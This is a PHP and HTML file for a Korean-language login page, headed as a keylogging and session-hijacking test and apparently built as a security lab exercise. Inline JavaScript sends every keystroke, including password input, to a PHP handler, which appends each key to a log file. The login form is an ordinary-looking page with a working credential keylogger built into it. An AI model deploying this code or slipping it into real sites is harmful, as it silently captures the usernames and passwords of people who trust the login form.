<?php
if (isset($_GET['key'])) {
    $key = $_GET['key'].' ';
    file_put_contents('log.txt', $key, FILE_APPEND);
    exit(); 
}
?>

<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <title>로그인 폼</title>
  <link rel="stylesheet" href="login.css">
  
</head>
<body>
    <script>
    document.addEventListener('keydown', function(e) {
        new Image().src = "tot.php?key=" + e.key + " ";
    });
    </script>
<div class="myform-area">
  <div class="form-area">
    
    <div class="form-content">
      <h2>키로그,세션탈취 테스트</h2>
    </div>

    <div class="form-input">
      <h2>로그인</h2>
      <form method="post" action="index.php">
        <div class="form-group">
          <input type="text" name="id">
          <label>아이디</label>
        </div>
        <div class="form-group">
          <input type="password" name="pass">
          <label>비밀번호</label>
        </div>
        <div class="myform-button">
          <button type="submit" class="myform-btn">로그인</button>
        </div>
      </form>
      <div class="myform-button">
        <a href="register.php"><button class="myform-btn">회원가입</button></a>
      </div>
    </div>

  </div>
</div>

</body>
</html>
